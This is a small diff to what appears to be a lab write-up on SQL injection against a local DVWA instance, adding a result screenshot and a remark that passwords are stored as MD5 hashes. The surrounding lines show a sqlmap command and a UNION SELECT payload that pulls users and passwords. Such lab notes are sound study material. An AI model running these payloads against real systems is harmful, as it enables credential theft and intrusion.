@@ -270,6 +270,12 @@ python sqlmap.py -u "http://localhost:4280/vulnerabilities/sqli_blind/?id=1&Subm
 ```
 ![image](https://github.com/user-attachments/assets/bf35e4a2-632a-4bcc-90f3-cf9b550dc037)
 
+Result 
+![image](https://github.com/user-attachments/assets/805d57a9-649b-488c-a73a-19d39cece45d)
+
+Any Password is by hashed MD5 such as **8d3533d75ae2c3966d7e0d4fcc69216b**
+
+
 ### 1.2 Attack by sqlinjection code
 ```
 ' UNION SELECT user, password FROM users #
